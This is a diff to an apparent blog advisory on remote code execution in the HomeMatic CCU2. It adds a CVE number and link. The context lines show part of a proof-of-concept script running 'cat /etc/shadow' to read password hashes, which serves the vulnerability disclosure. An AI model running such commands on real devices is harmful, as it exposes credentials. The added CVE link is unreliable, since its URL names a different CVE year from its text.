@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Remote Code Execution in HomeMatic CCU2"
+title: "CVE-2018-7297: Remote Code Execution in HomeMatic CCU2"
 date:   2018-02-21 17:00:00
 image:
       url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
@@ -37,6 +37,10 @@ string stderr;
 system.Exec("cat /etc/shadow", &stdout, &stderr);
 WriteLine(stdout);
 ```
+
+# CVE
+
+[CVE-2018-7297](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7297)
 
 # Credit
 
